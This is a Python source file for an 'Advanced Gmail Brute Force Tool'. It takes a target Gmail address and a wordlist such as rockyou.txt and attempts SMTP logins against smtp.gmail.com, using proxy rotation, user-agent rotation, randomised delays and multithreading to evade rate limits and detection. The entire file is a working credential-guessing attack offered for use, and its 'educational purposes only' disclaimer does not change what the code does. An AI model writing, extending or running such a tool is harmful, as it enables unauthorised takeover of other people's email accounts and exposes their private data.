#!/usr/bin/env python3
"""
Advanced Gmail Brute Force Tool with Modern Evasion Techniques
Author: Educational Purpose Only
Version: 2.0

Features:
- Proxy rotation for IP changing
- User-Agent rotation
- Smart rate limiting
- Multi-threading support
- Advanced retry mechanisms
- Detailed logging
- Configuration file support
"""

import smtplib
import sys
import time
import random
import threading
import socket
import socks
import logging
import configparser
from queue import Queue
from pathlib import Path
from datetime import datetime
from fake_useragent import UserAgent
from colorama import init, Fore, Back, Style
import ssl

# Initialize colorama for colored output
init(autoreset=True)

class AdvancedGmailBruteForcer:
    def __init__(self, config_file="configs/config.ini"):
        self.config = configparser.ConfigParser()
        self.config.read(config_file)
        
        # Load configuration
        self.min_delay = float(self.config.get('DEFAULT', 'min_delay', fallback=2))
        self.max_delay = float(self.config.get('DEFAULT', 'max_delay', fallback=8))
        self.retry_attempts = int(self.config.get('DEFAULT', 'retry_attempts', fallback=3))
        self.connection_timeout = int(self.config.get('DEFAULT', 'connection_timeout', fallback=30))
        self.max_threads = int(self.config.get('DEFAULT', 'max_threads', fallback=5))
        self.thread_delay = float(self.config.get('DEFAULT', 'thread_delay', fallback=1))
        self.use_proxy = self.config.getboolean('DEFAULT', 'use_proxy', fallback=False)
        self.proxy_rotation = self.config.getboolean('DEFAULT', 'proxy_rotation', fallback=True)
        self.proxy_timeout = int(self.config.get('DEFAULT', 'proxy_timeout', fallback=10))
        self.smtp_server = self.config.get('DEFAULT', 'smtp_server', fallback='smtp.gmail.com')
        self.smtp_port = int(self.config.get('DEFAULT', 'smtp_port', fallback=587))
        self.rotate_user_agent = self.config.getboolean('DEFAULT', 'rotate_user_agent', fallback=True)
        
        # Initialize components
        self.setup_logging()
        self.load_proxies()
        self.setup_user_agents()
        
        # Threading
        self.password_queue = Queue()
        self.found_password = None
        self.stop_threads = False
        self.threads = []
        self.lock = threading.Lock()
        
        # Statistics
        self.attempts = 0
        self.start_time = None
        
    def setup_logging(self):
        """Setup logging configuration"""
        log_level = self.config.get('DEFAULT', 'log_level', fallback='INFO')
        log_file = self.config.get('DEFAULT', 'log_file', fallback='brute_force.log')
        
        logging.basicConfig(
            level=getattr(logging, log_level),
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
        
    def load_proxies(self):
        """Load proxy list from file"""
        self.proxies = []
        if self.use_proxy:
            try:
                with open('configs/proxies.txt', 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            self.proxies.append(line)
                self.logger.info(f"Loaded {len(self.proxies)} proxies")
            except FileNotFoundError:
                self.logger.warning("Proxies file not found, running without proxy")
                self.use_proxy = False
                
    def setup_user_agents(self):
        """Setup user agent rotation"""
        if self.rotate_user_agent:
            try:
                self.ua = UserAgent()
                self.logger.info("User-Agent rotation enabled")
            except Exception as e:
                self.logger.warning(f"Failed to setup User-Agent rotation: {e}")
                self.rotate_user_agent = False
                
    def get_random_proxy(self):
        """Get a random proxy from the list"""
        if not self.proxies:
            return None
        return random.choice(self.proxies)
        
    def setup_proxy_connection(self, proxy_string=None):
        """Setup SOCKS proxy connection"""
        if not proxy_string:
            return None
            
        try:
            parts = proxy_string.split(':')
            proxy_ip = parts[0]
            proxy_port = int(parts[1])
            
            # Setup SOCKS proxy
            socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
            socket.socket = socks.socksocket
            
            self.logger.info(f"Using proxy: {proxy_ip}:{proxy_port}")
            return True
        except Exception as e:
            self.logger.error(f"Failed to setup proxy {proxy_string}: {e}")
            return False
            
    def smart_delay(self):
        """Implement smart delay with jitter"""
        base_delay = random.uniform(self.min_delay, self.max_delay)
        # Add jitter based on current attempts
        jitter = random.uniform(0.5, 2.0) * (1 + self.attempts / 1000)
        total_delay = base_delay + jitter
        time.sleep(total_delay)
        
    def create_smtp_connection(self, proxy=None):
        """Create SMTP connection with optional proxy"""
        for attempt in range(self.retry_attempts):
            try:
                if proxy and self.setup_proxy_connection(proxy):
                
                    pass
                    
                smtpserver = smtplib.SMTP(self.smtp_server, self.smtp_port, timeout=self.connection_timeout)
                smtpserver.ehlo()
                smtpserver.starttls()
                
                return smtpserver
                
            except Exception as e:
                self.logger.warning(f"Connection attempt {attempt + 1} failed: {e}")
                if attempt < self.retry_attempts - 1:
                    time.sleep(2 ** attempt) 
                else:
                    raise e
                    
    def attempt_login(self, username, password, thread_id):
        """Attempt login with enhanced error handling"""
        if self.stop_threads or self.found_password:
            return False
            
        proxy = None
        if self.use_proxy and self.proxy_rotation:
            proxy = self.get_random_proxy()
            
        try:
            self.smart_delay()
            
            smtpserver = self.create_smtp_connection(proxy)
            
            smtpserver.login(username, password)
            
            with self.lock:
                if not self.found_password:
                    self.found_password = password
                    self.stop_threads = True
                    
            print(f"{Fore.GREEN}[SUCCESS] Password Found: {password}{Style.RESET_ALL}")
            self.logger.info(f"Password found: {password}")
            
            smtpserver.quit()
            return True
            
        except smtplib.SMTPAuthenticationError:
            with self.lock:
                self.attempts += 1
            print(f"{Fore.RED}[FAIL] Thread-{thread_id}: {password}{Style.RESET_ALL}")
            self.logger.debug(f"Failed password: {password}")
            
        except smtplib.SMTPServerDisconnected as e:
            self.logger.warning(f"SMTP server disconnected: {e}")
            time.sleep(random.uniform(10, 20))
            
        except smtplib.SMTPRecipientsRefused as e:
            self.logger.error(f"Recipients refused: {e}")
            
        except smtplib.SMTPSenderRefused as e:
            self.logger.error(f"Sender refused: {e}")
            
        except smtplib.SMTPDataError as e:
            self.logger.error(f"SMTP data error: {e}")
            
        except socket.timeout:
            self.logger.warning(f"Connection timeout with proxy: {proxy}")
            
        except Exception as e:
            self.logger.error(f"Unexpected error: {e}")
            
        finally:
            try:
                if 'smtpserver' in locals():
                    smtpserver.quit()
            except:
                pass
                
        return False
        
    def worker_thread(self, username, thread_id):
        """Worker thread for password attempts"""
        self.logger.info(f"Thread-{thread_id} started")
        
        while not self.stop_threads and not self.password_queue.empty():
            try:
                password = self.password_queue.get(timeout=1)
                if self.attempt_login(username, password, thread_id):
                    break
                    
                # Small delay between attempts in same thread
                time.sleep(self.thread_delay)
                
            except Exception as e:
                self.logger.error(f"Thread-{thread_id} error: {e}")
                break
                
        self.logger.info(f"Thread-{thread_id} finished")
        
    def load_passwords(self, password_file):
        """Load passwords from file"""
        passwords = []
        try:
            with open(password_file, 'rb') as f:
                for line in f:
                    try:
                        password = line.strip().decode('utf-8', errors='ignore')
                        if password:
                            passwords.append(password)
                    except UnicodeDecodeError:
                        continue
            return passwords
        except FileNotFoundError:
            self.logger.error(f"Password file not found: {password_file}")
            return []
            
    def print_statistics(self):
        """Print current statistics"""
        if self.start_time:
            elapsed = time.time() - self.start_time
            rate = self.attempts / elapsed if elapsed > 0 else 0
            
            print(f"\n{Fore.CYAN}=== Statistics ==={Style.RESET_ALL}")
            print(f"Attempts: {self.attempts}")
            print(f"Elapsed: {elapsed:.2f}s")
            print(f"Rate: {rate:.2f} attempts/sec")
            print(f"Remaining: {self.password_queue.qsize()}")
            
    def brute_force_attack(self, username, passwords):
        """Main brute force attack with threading"""
        self.start_time = time.time()
        
        # Fill password queue
        for password in passwords:
            self.password_queue.put(password)
            
        print(f"{Fore.YELLOW}Starting brute force attack on {username}{Style.RESET_ALL}")
        print(f"Total passwords: {len(passwords)}")
        print(f"Using {self.max_threads} threads")
        print(f"Proxy enabled: {self.use_proxy}")
        
        # Start worker threads
        for i in range(self.max_threads):
            thread = threading.Thread(
                target=self.worker_thread,
                args=(username, i+1),
                daemon=True
            )
            thread.start()
            self.threads.append(thread)
            time.sleep(0.5)  # Stagger thread starts
            
        # Monitor progress
        try:
            while any(t.is_alive() for t in self.threads) and not self.found_password:
                time.sleep(5)
                self.print_statistics()
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}Attack interrupted by user{Style.RESET_ALL}")
            self.stop_threads = True
            
        # Wait for threads to finish
        for thread in self.threads:
            thread.join(timeout=2)
            
        # Final statistics
        self.print_statistics()
        
        return self.found_password is not None

def main():
    print(f"{Fore.CYAN}=== Advanced Gmail Brute Force Tool v2.0 ==={Style.RESET_ALL}")
    print(f"{Fore.RED}WARNING: For educational purposes only!{Style.RESET_ALL}")
    print()
    
    # Initialize brute forcer
    try:
        bf = AdvancedGmailBruteForcer()
    except Exception as e:
        print(f"Failed to initialize: {e}")
        sys.exit(1)
        
    # Get target email
    username = input("Target Gmail Address: ").strip()
    if not username:
        print("No email address provided!")
        sys.exit(1)
        
    print()
    
    # Get password list
    password_list_option = input("'0' for rockyou.txt\n'1' for other list\n: ")
    
    if password_list_option == '0':
        password_file = "rockyou.txt"
    elif password_list_option == '1':
        password_file = input("Enter the file path for the password list: ")
    else:
        print("\nInvalid input!")
        sys.exit(1)
        
    # Load passwords
    passwords = bf.load_passwords(password_file)
    if not passwords:
        print("No passwords loaded!")
        sys.exit(1)
        
    # Start attack
    try:
        if bf.brute_force_attack(username, passwords):
            print(f"\n{Fore.GREEN}SUCCESS: Password found - {bf.found_password}{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}FAILED: Password not found in the provided list{Style.RESET_ALL}")
            
    except Exception as e:
        print(f"Attack failed: {e}")
        bf.logger.error(f"Attack failed: {e}")

if __name__ == "__main__":
    main()